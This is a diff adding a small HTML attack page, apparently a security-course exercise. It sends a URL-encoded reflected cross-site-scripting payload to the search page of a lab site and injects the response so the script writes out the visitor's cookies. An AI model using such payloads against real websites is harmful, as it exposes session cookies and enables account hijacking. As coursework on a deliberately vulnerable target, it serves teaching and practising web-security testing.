@@ -1,0 +1,24 @@
+<html>
+
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+
+
+
+<body id="bodytag">
+
+	<iframe name="iframe"></iframe>
+
+</body>
+
+
+
+<script>
+	$.get("https://project2.ecen4133.org/search?q=%3Cscript%3Edocument.write%28document.cookie%29%3C%2Fscript%3E", function(data){
+		$(".result").html(data);
+		document.getElementById("bodytag").innerHTML = data;
+	});
+</script>
+
+</html>
